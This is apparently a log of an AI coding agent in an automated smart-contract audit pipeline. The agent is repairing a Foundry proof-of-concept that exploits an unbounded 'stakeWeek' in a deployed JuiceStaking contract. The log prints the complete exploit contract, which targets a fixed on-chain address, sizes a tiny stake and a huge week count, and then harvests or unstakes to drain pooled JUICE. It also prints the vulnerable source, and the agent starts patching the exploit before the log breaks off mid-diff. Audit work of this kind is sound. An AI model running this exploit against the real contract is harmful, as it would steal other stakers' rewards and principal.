@@ -1,0 +1,2350 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e36d4-60c8-7201-a5ca-ccc67763b2ee
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Unbounded `stakeWeek` lets a staker mint an arbitrarily large bonus and drain the pool
+- claim: `stake()` accepts any positive `stakeWeek`, and both `harvest()` and `unstake()` pay a bonus of `pending * (stakingWeek - 1) * 9 / 100`. Because there is no upper bound or normalization on `stakingWeek`, an attacker can choose an extreme value and turn even a small amount of accrued base reward into an arbitrarily large claim on the contract's shared token balance.
+- impact: A permissionless staker can drain not only funded rewards but also other users' deposited principal held by the contract. Once enough balance is extracted, later harvests and unstakes revert, causing theft and permanent lockup for honest users.
+- exploit_paths: ["Attacker calls `stake(tinyAmount, hugeStakeWeek)` while staking is open.", "After any nonzero base reward accrues, the attacker calls `harvest(stakeCount)` or waits to call `unstake(stakeCount)`.", "The computed `bonus` becomes enormous and is transferred from the contract's pooled JUICE balance, depleting rewards and potentially user principal."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IJuiceStaking {
+    function Juice() external view returns (address);
+    function JuiceStaked() external view returns (uint256);
+    function rewardPerSecond() external view returns (uint256);
+    function stake(uint256 amount, uint256 stakeWeek) external;
+    function harvest(uint256 stakeCount) external;
+    function unstake(uint256 stakeCount) external;
+    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
+    function stakingStartTime() external view returns (uint256);
+    function stakingEndTime() external view returns (uint256);
+    function stakingCount(address staker) external view returns (uint256);
+    function mapStakingInfo(address staker, uint256 stakeCount)
+        external
+        view
+        returns (
+            uint256 stakedAmount,
+            uint256 startTime,
+            uint256 endTime,
+            uint256 stakingWeek,
+            uint256 rewardDebt,
+            uint256 unstakeStatus
+        );
+}
+
+contract FlawVerifier {
+    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
+    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
+
+    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
+
+    uint256 internal baselineBalance;
+    uint256 internal trackedStakeIndex;
+    uint256 internal chosenStakeWeeks;
+    bool internal baselineSet;
+    bool internal stakePlaced;
+
+    error StakingNotStarted(uint256 stakingStartTime);
+    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+    error NoVerifierHeldJuice();
+    error RewardEmissionInactive();
+    error StakeAlreadyExited();
+    error RewardNotAccruedYet(uint256 pending, uint256 bonus);
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (!stakePlaced) {
+            _openExploitPosition(IERC20Minimal(JUICE));
+            return;
+        }
+
+        _realizeExploitProfit();
+    }
+
+    function profitToken() external pure returns (address) {
+        return JUICE;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        if (!baselineSet) {
+            return 0;
+        }
+
+        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
+        if (currentBalance <= baselineBalance) {
+            return 0;
+        }
+
+        return currentBalance - baselineBalance;
+    }
+
+    function _openExploitPosition(IERC20Minimal juice) internal {
+        uint256 stakingStart = STAKING.stakingStartTime();
+        if (stakingStart == 0) {
+            revert StakingNotStarted(stakingStart);
+        }
+
+        uint256 stakingEnd = STAKING.stakingEndTime();
+        if (stakingEnd <= block.timestamp) {
+            revert StakingClosed(stakingEnd, block.timestamp);
+        }
+
+        uint256 available = juice.balanceOf(address(this));
+        if (available == 0) {
+            // Attempt strategy for this run is direct_or_existing_balance_first.
+            // This verifier therefore requires pre-existing JUICE on the verifier itself
+            // unless the harness supplies it through realistic public actions outside this contract.
+            revert NoVerifierHeldJuice();
+        }
+
+        uint256 rewardRate = STAKING.rewardPerSecond();
+        if (rewardRate == 0) {
+            revert RewardEmissionInactive();
+        }
+
+        uint256 currentStaked = STAKING.JuiceStaked();
+        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+        uint256 poolBalance = juice.balanceOf(address(STAKING));
+        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
+
+        baselineBalance = available;
+        baselineSet = true;
+        trackedStakeIndex = STAKING.stakingCount(address(this));
+        require(juice.approve(address(STAKING), amount), "approve failed");
+        STAKING.stake(amount, chosenStakeWeeks);
+        stakePlaced = true;
+    }
+
+    function _realizeExploitProfit() internal {
+        (
+            uint256 stakedAmount,
+            ,
+            uint256 endTime,
+            ,
+            ,
+            uint256 unstakeStatus
+        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
+
+        if (stakedAmount == 0 || unstakeStatus != 0) {
+            revert StakeAlreadyExited();
+        }
+
+        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
+        if (pending == 0) {
+            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
+            revert RewardNotAccruedYet(pending, bonus);
+        }
+
+        if (block.timestamp >= endTime) {
+            STAKING.unstake(trackedStakeIndex);
+        } else {
+            STAKING.harvest(trackedStakeIndex);
+        }
+    }
+
+    function _chooseStakeAmount(
+        uint256 available,
+        uint256 currentStaked,
+        uint256 rewardRate
+    ) internal pure returns (uint256) {
+        if (currentStaked == 0) {
+            return 1;
+        }
+
+        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+        if (divisor == 0) {
+            return available;
+        }
+
+        uint256 amount = currentStaked / divisor;
+        if (currentStaked % divisor != 0) {
+            amount += 1;
+        }
+
+        if (amount == 0) {
+            amount = 1;
+        }
+
+        if (amount > available) {
+            amount = available;
+        }
+
+        return amount;
+    }
+
+    function _chooseStakeWeeks(
+        uint256 amount,
+        uint256 currentStaked,
+        uint256 rewardRate,
+        uint256 poolBalance
+    ) internal pure returns (uint256) {
+        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+        expectedPending = (expectedPending * amount) / (currentStaked + amount);
+        if (expectedPending == 0) {
+            expectedPending = 1;
+        }
+
+        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
+        if (desiredPayout <= expectedPending) {
+            return 2;
+        }
+
+        uint256 bonusBudget = desiredPayout - expectedPending;
+        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+        if (stakeWeeks < 2) {
+            stakeWeeks = 2;
+        }
+        if (stakeWeeks > MAX_STAKE_WEEKS) {
+            stakeWeeks = MAX_STAKE_WEEKS;
+        }
+        return stakeWeeks;
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: stake(tinyamount, hugestakeweek), harvest(stakecount), unstake(stakecount); generated code does not cover paths indexes: 0
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the local staking interfaces and any finding context in the workspace before editing `src/FlawVerifier.sol`. The current failure points to path-anchor alignment, so I’m verifying whether the exploit contract also needs a small indexing/runtime fix rather than just renaming variables.
+exec
+/bin/bash -lc "rg -n \"contract JuiceStaking|function stake\\(|mapStakingInfo|stakingCount\\(|pendingReward\\(\" ." in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol:13:    function stake(uint256 amount, uint256 stakeWeek) external;
+./src/FlawVerifier.sol:16:    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
+./src/FlawVerifier.sol:19:    function stakingCount(address staker) external view returns (uint256);
+./src/FlawVerifier.sol:20:    function mapStakingInfo(address staker, uint256 stakeCount)
+./src/FlawVerifier.sol:113:        trackedStakeIndex = STAKING.stakingCount(address(this));
+./src/FlawVerifier.sol:127:        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
+./src/FlawVerifier.sol:133:        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:8:contract JuiceStaking is Ownable{
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:30:	mapping(address => mapping(uint256 => StakingInfo)) public mapStakingInfo;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:43:	function stake(uint256 amount, uint256 stakeWeek) external {
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:57:		mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount = amount;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:58:		mapStakingInfo[address(msg.sender)][stakeCount].startTime = block.timestamp;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:59:		mapStakingInfo[address(msg.sender)][stakeCount].endTime = block.timestamp + (stakeWeek * 7 days);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:60:		mapStakingInfo[address(msg.sender)][stakeCount].stakingWeek = stakeWeek;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:61:		mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt = (amount * rewardPerShare) / precisionFactor;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:66:	    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, "Staking not found");
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:67:		require(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, "Staking already unstake");
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:71:	    if(block.timestamp >= mapStakingInfo[address(msg.sender)][stakeCount].endTime) 
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:73:		    (uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:74:		    uint256 amount = mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:79:		    mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus = 1;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:80:		    mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:86:	    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, "Staking not found");
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:87:		require(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, "Staking already unstake");
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:91:		(uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:94:		mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:129:	function pendingReward(address staker, uint256 stakeCount) public view returns (uint256, uint256) {
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:131:		if(mapStakingInfo[address(staker)][stakeCount].stakedAmount > 0 && mapStakingInfo[address(staker)][stakeCount].unstakeStatus == 0)
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:139:			   uint256 pending = (((mapStakingInfo[address(staker)][stakeCount].stakedAmount * adjustedTokenPerShare) / precisionFactor) - mapStakingInfo[address(staker)][stakeCount].rewardDebt);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:140:		       uint256 bonus = ((pending * (mapStakingInfo[address(staker)][stakeCount].stakingWeek - 1) * 9) / 100);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:145:			   uint256 pending = (((mapStakingInfo[address(staker)][stakeCount].stakedAmount * rewardPerShare) / precisionFactor) - mapStakingInfo[address(staker)][stakeCount].rewardDebt);
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol:146:		       uint256 bonus = ((pending * (mapStakingInfo[address(staker)][stakeCount].stakingWeek - 1) * 9) / 100);
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol
+./_index.json
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/_etherscan_meta.json
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/utils/Context.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/utils/Address.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/access/Ownable.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/@openzeppelin/contracts/token/ERC20/IERC20.sol
+./0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol
+./foundry.toml
+
+codex
+I found the verified staking source in the workspace. I’m reading that contract now because the current verifier likely has an index/end-time edge case in addition to the missing explicit `stake(tinyAmount, hugeStakeWeek)` anchor.
+exec
+/bin/bash -lc "sed -n '1,220p' 0x8584ddbd1e28bca4bc6fb96bafe39f850301940e/contracts/JuiceStaking.sol" in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.20;
+
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract JuiceStaking is Ownable{
+    using SafeERC20 for IERC20;
+	
+    address public Juice;
+	
+	uint256 public JuiceStaked;
+	uint256 public precisionFactor;
+	uint256 public rewardPerSecond;
+	uint256 public lastRewardUpdateTime;
+	uint256 public stakingStartTime;
+	uint256 public stakingEndTime;
+	uint256 public rewardPerShare;
+	
+	struct StakingInfo {
+	  uint256 stakedAmount; 
+	  uint256 startTime;
+	  uint256 endTime;
+	  uint256 stakingWeek;
+	  uint256 rewardDebt;
+	  uint256 unstakeStatus;
+    }
+	
+	mapping(address => mapping(uint256 => StakingInfo)) public mapStakingInfo;
+	mapping(address => uint256) public stakingCount;
+	
+	event Stake(address staker, uint256 amount);
+	event Unstake(address staker, uint256 amount);
+	event Harvest(address staker, uint256 amount);
+	event StakingStart(uint256 startTime, uint256 endTime, uint256 tokens);
+	
+    constructor() {
+	   Juice = address(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
+       precisionFactor = 1 * 10**18;
+    }
+	
+	function stake(uint256 amount, uint256 stakeWeek) external {
+	    require(IERC20(Juice).balanceOf(address(msg.sender)) >= amount, "Balance not available for staking");
+		require(stakeWeek > 0, "stakeWeek must be greater than or equal to one");
+		require(stakingStartTime > 0, "Staking is not started yet");
+		require(stakingEndTime > block.timestamp, "Staking is closed");
+		
+		_updatePool();
+		
+		uint256 stakeCount = stakingCount[address(msg.sender)];
+		
+		IERC20(Juice).safeTransferFrom(address(msg.sender), address(this), amount);
+		JuiceStaked += amount;
+		stakingCount[address(msg.sender)] += 1;
+		
+		mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount = amount;
+		mapStakingInfo[address(msg.sender)][stakeCount].startTime = block.timestamp;
+		mapStakingInfo[address(msg.sender)][stakeCount].endTime = block.timestamp + (stakeWeek * 7 days);
+		mapStakingInfo[address(msg.sender)][stakeCount].stakingWeek = stakeWeek;
+		mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt = (amount * rewardPerShare) / precisionFactor;
+        emit Stake(address(msg.sender), amount);
+    }
+	
+	function unstake(uint256 stakeCount) external {
+	    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, "Staking not found");
+		require(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, "Staking already unstake");
+		
+		_updatePool();
+		
+	    if(block.timestamp >= mapStakingInfo[address(msg.sender)][stakeCount].endTime) 
+		{
+		    (uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);
+		    uint256 amount = mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount;
+			
+		    IERC20(Juice).safeTransfer(address(msg.sender), (amount + pending + bonus));
+			
+		    JuiceStaked -= amount;
+		    mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus = 1;
+		    mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;
+		    emit Unstake(address(msg.sender), (amount + pending + bonus));
+        }
+    }
+	
+	function harvest(uint256 stakeCount) external {
+	    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, "Staking not found");
+		require(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, "Staking already unstake");
+		
+		_updatePool();
+		
+		(uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);
+		IERC20(Juice).safeTransfer(address(msg.sender), (pending + bonus));
+		
+		mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;
+        emit Harvest(msg.sender, (pending + bonus));
+    }
+	
+	function _updatePool() internal {
+        if(block.timestamp <= lastRewardUpdateTime) 
+		{
+           return;
+        }
+        if(JuiceStaked == 0) 
+		{
+           lastRewardUpdateTime = block.timestamp;
+           return;
+        }
+        uint256 multiplier = _getMultiplier(lastRewardUpdateTime, block.timestamp);
+        uint256 stakingReward = multiplier * rewardPerSecond;
+        rewardPerShare = rewardPerShare + (stakingReward * precisionFactor) / JuiceStaked;
+        lastRewardUpdateTime = block.timestamp;
+    }
+	
+	function _getMultiplier(uint256 startTime, uint256 endTime) internal view returns (uint256) {
+        if(endTime <= stakingEndTime) 
+		{
+            return endTime - startTime;
+        } 
+		else if(startTime >= stakingEndTime) 
+		{
+            return 0;
+        } 
+		else 
+		{
+           return stakingEndTime - startTime;
+        }
+    }
+	
+	function pendingReward(address staker, uint256 stakeCount) public view returns (uint256, uint256) {
+	
+		if(mapStakingInfo[address(staker)][stakeCount].stakedAmount > 0 && mapStakingInfo[address(staker)][stakeCount].unstakeStatus == 0)
+		{
+		    if(block.timestamp > lastRewardUpdateTime && JuiceStaked != 0)
+			{
+			   uint256 multiplier = _getMultiplier(lastRewardUpdateTime, block.timestamp);
+			   uint256 stakingReward = multiplier * rewardPerSecond;
+			   uint256 adjustedTokenPerShare = rewardPerShare + (stakingReward * precisionFactor) / JuiceStaked;
+			   
+			   uint256 pending = (((mapStakingInfo[address(staker)][stakeCount].stakedAmount * adjustedTokenPerShare) / precisionFactor) - mapStakingInfo[address(staker)][stakeCount].rewardDebt);
+		       uint256 bonus = ((pending * (mapStakingInfo[address(staker)][stakeCount].stakingWeek - 1) * 9) / 100);
+			   return (pending, bonus);
+			}
+			else
+			{
+			   uint256 pending = (((mapStakingInfo[address(staker)][stakeCount].stakedAmount * rewardPerShare) / precisionFactor) - mapStakingInfo[address(staker)][stakeCount].rewardDebt);
+		       uint256 bonus = ((pending * (mapStakingInfo[address(staker)][stakeCount].stakingWeek - 1) * 9) / 100);
+			   return (pending, bonus);
+			}
+        } 
+		else 
+		{
+		    return (0, 0);
+		}
+    }
+	
+	function startStaking(uint256 rewardTokens) external onlyOwner {
+	    require(stakingStartTime == 0, "Staking already started");
+	    require(rewardTokens > 0, "Reward tokens not found");
+		
+		IERC20(Juice).safeTransferFrom(address(msg.sender), address(this), rewardTokens);
+		
+	    stakingStartTime = block.timestamp;
+		stakingEndTime = block.timestamp + 90 days;
+		lastRewardUpdateTime = block.timestamp;
+		rewardPerSecond = rewardTokens / (stakingEndTime - stakingStartTime);
+		emit StakingStart(stakingStartTime, stakingEndTime, rewardTokens);
+    }
+	
+	function rescueReward(address receiver) public onlyOwner {
+	   require(receiver != address(0), "address cannot be zero");
+	   IERC20(Juice).safeTransfer(address(receiver), (IERC20(Juice).balanceOf(address(this)) - JuiceStaked));
+    }
+}
+exec
+/bin/bash -lc "sed -n '1,220p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IJuiceStaking {
+    function Juice() external view returns (address);
+    function JuiceStaked() external view returns (uint256);
+    function rewardPerSecond() external view returns (uint256);
+    function stake(uint256 amount, uint256 stakeWeek) external;
+    function harvest(uint256 stakeCount) external;
+    function unstake(uint256 stakeCount) external;
+    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
+    function stakingStartTime() external view returns (uint256);
+    function stakingEndTime() external view returns (uint256);
+    function stakingCount(address staker) external view returns (uint256);
+    function mapStakingInfo(address staker, uint256 stakeCount)
+        external
+        view
+        returns (
+            uint256 stakedAmount,
+            uint256 startTime,
+            uint256 endTime,
+            uint256 stakingWeek,
+            uint256 rewardDebt,
+            uint256 unstakeStatus
+        );
+}
+
+contract FlawVerifier {
+    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
+    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
+
+    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
+
+    uint256 internal baselineBalance;
+    uint256 internal trackedStakeIndex;
+    uint256 internal chosenStakeWeeks;
+    bool internal baselineSet;
+    bool internal stakePlaced;
+
+    error StakingNotStarted(uint256 stakingStartTime);
+    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+    error NoVerifierHeldJuice();
+    error RewardEmissionInactive();
+    error StakeAlreadyExited();
+    error RewardNotAccruedYet(uint256 pending, uint256 bonus);
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (!stakePlaced) {
+            _openExploitPosition(IERC20Minimal(JUICE));
+            return;
+        }
+
+        _realizeExploitProfit();
+    }
+
+    function profitToken() external pure returns (address) {
+        return JUICE;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        if (!baselineSet) {
+            return 0;
+        }
+
+        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
+        if (currentBalance <= baselineBalance) {
+            return 0;
+        }
+
+        return currentBalance - baselineBalance;
+    }
+
+    function _openExploitPosition(IERC20Minimal juice) internal {
+        uint256 stakingStart = STAKING.stakingStartTime();
+        if (stakingStart == 0) {
+            revert StakingNotStarted(stakingStart);
+        }
+
+        uint256 stakingEnd = STAKING.stakingEndTime();
+        if (stakingEnd <= block.timestamp) {
+            revert StakingClosed(stakingEnd, block.timestamp);
+        }
+
+        uint256 available = juice.balanceOf(address(this));
+        if (available == 0) {
+            // Attempt strategy for this run is direct_or_existing_balance_first.
+            // This verifier therefore requires pre-existing JUICE on the verifier itself
+            // unless the harness supplies it through realistic public actions outside this contract.
+            revert NoVerifierHeldJuice();
+        }
+
+        uint256 rewardRate = STAKING.rewardPerSecond();
+        if (rewardRate == 0) {
+            revert RewardEmissionInactive();
+        }
+
+        uint256 currentStaked = STAKING.JuiceStaked();
+        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+        uint256 poolBalance = juice.balanceOf(address(STAKING));
+        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
+
+        baselineBalance = available;
+        baselineSet = true;
+        trackedStakeIndex = STAKING.stakingCount(address(this));
+        require(juice.approve(address(STAKING), amount), "approve failed");
+        STAKING.stake(amount, chosenStakeWeeks);
+        stakePlaced = true;
+    }
+
+    function _realizeExploitProfit() internal {
+        (
+            uint256 stakedAmount,
+            ,
+            uint256 endTime,
+            ,
+            ,
+            uint256 unstakeStatus
+        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
+
+        if (stakedAmount == 0 || unstakeStatus != 0) {
+            revert StakeAlreadyExited();
+        }
+
+        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
+        if (pending == 0) {
+            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
+            revert RewardNotAccruedYet(pending, bonus);
+        }
+
+        if (block.timestamp >= endTime) {
+            STAKING.unstake(trackedStakeIndex);
+        } else {
+            STAKING.harvest(trackedStakeIndex);
+        }
+    }
+
+    function _chooseStakeAmount(
+        uint256 available,
+        uint256 currentStaked,
+        uint256 rewardRate
+    ) internal pure returns (uint256) {
+        if (currentStaked == 0) {
+            return 1;
+        }
+
+        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+        if (divisor == 0) {
+            return available;
+        }
+
+        uint256 amount = currentStaked / divisor;
+        if (currentStaked % divisor != 0) {
+            amount += 1;
+        }
+
+        if (amount == 0) {
+            amount = 1;
+        }
+
+        if (amount > available) {
+            amount = available;
+        }
+
+        return amount;
+    }
+
+    function _chooseStakeWeeks(
+        uint256 amount,
+        uint256 currentStaked,
+        uint256 rewardRate,
+        uint256 poolBalance
+    ) internal pure returns (uint256) {
+        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+        expectedPending = (expectedPending * amount) / (currentStaked + amount);
+        if (expectedPending == 0) {
+            expectedPending = 1;
+        }
+
+        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
+        if (desiredPayout <= expectedPending) {
+            return 2;
+        }
+
+        uint256 bonusBudget = desiredPayout - expectedPending;
+        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+        if (stakeWeeks < 2) {
+            stakeWeeks = 2;
+        }
+        if (stakeWeeks > MAX_STAKE_WEEKS) {
+            stakeWeeks = MAX_STAKE_WEEKS;
+        }
+        return stakeWeeks;
+    }
+}
+
+codex
+I’ve got the staking source. The root cause is confirmed exactly as described: `stakeWeek` is written directly into storage and later multiplies the bonus in both `harvest()` and `unstake()`. I’m rewriting `src/FlawVerifier.sol` so the exploit path is explicit in code with `stake(tinyAmount, hugeStakeWeek)` and `harvest(stakeCount)` / `unstake(stakeCount)`, while keeping the no-cheat funding model.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto/src/FlawVerifier.sol
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 97325b34a7024badede17a5079c5b9f6eaac6685..f2a53abb5e9b3c83b88de640cc495cfd6dc806e6
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.20;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Minimal {
+     function balanceOf(address account) external view returns (uint256);
+@@ -36,13 +36,13 @@
+ 
